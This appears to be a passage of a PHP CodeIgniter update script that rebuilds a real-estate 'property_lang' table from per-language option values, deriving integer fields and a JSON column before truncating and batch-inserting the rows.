        $update_output .= 'FIX DATA property_lang START'.'<br />';
        
        $this->load->model('option_m');
        
        $langs = $this->language_m->get();
        $options_name = $this->option_m->get();
        $data_batch = array();
        
        $fields = $this->db->list_fields('property_lang');
        $fields = array_flip($fields);
        
        foreach($langs as $row_lang)
        {
            $options = $this->option_m->get_options($row_lang->id);
            
            $query = $this->db->query("SELECT * FROM property;");
            if ($query->num_rows() > 0)
            {
               foreach ($query->result() as $row_property)
               {
                    $row_property_id = $row_property->id;
                    
                    $data_property_lang = array();
                    $data_property_lang['property_id'] = intval($row_property->id);
                    $data_property_lang['language_id'] = intval($row_lang->id);
                    $json_obj = array();
                    foreach($options_name as $option_name)
                    {
                        $option_id = $option_name->id;

                        if(isset($options[$row_property_id][$option_id]))
                        {
                            $option_val = $options[$row_property_id][$option_id];
                            $json_obj['field_'.$option_id] = $option_val;
                            
                            if(!empty($option_val))
                            {
                                if (isset($fields['field_'.$option_id]))
                                {
                                    $data_property_lang['field_'.$option_id] = $option_val;
                                } 
                                
                                $value_n = trim($option_val);
                                $value_n = str_replace("'", '', $value_n);
                                $value_n = str_replace("�", '', $value_n);
                                $value_n = str_replace(",", '', $value_n);
                                
                                if(is_numeric($value_n) && isset($fields['field_'.$option_id.'_int']))
                                {
                                    $data_property_lang['field_'.$option_id.'_int'] = intval($value_n);
                                }
                            }
                        }
                    }
                    
                    // check fields consistent
                    foreach($fields as $key_c=>$val_c)
                    {
                        if(!isset($data_property_lang[$key_c]))
                        {
                            $data_property_lang[$key_c] = NULL;
                        }
                    }
                    
                    $data_property_lang['json_object'] = json_encode($json_obj);
                    
                    if(sw_count($data_property_lang) > 3)
                        $data_batch[] = $data_property_lang;
               }
            } 
        }
        
        $update_output .= 'FOR INSERT: '.sw_count($data_batch).'<br />';

        if(sw_count($data_batch) > 0)
        {
            $this->db->truncate('property_lang');
            $this->db->insert_batch('property_lang', $data_batch); 
        }
        
        $update_output .= 'FIX DATA property_lang END'.'<br />';
	}

}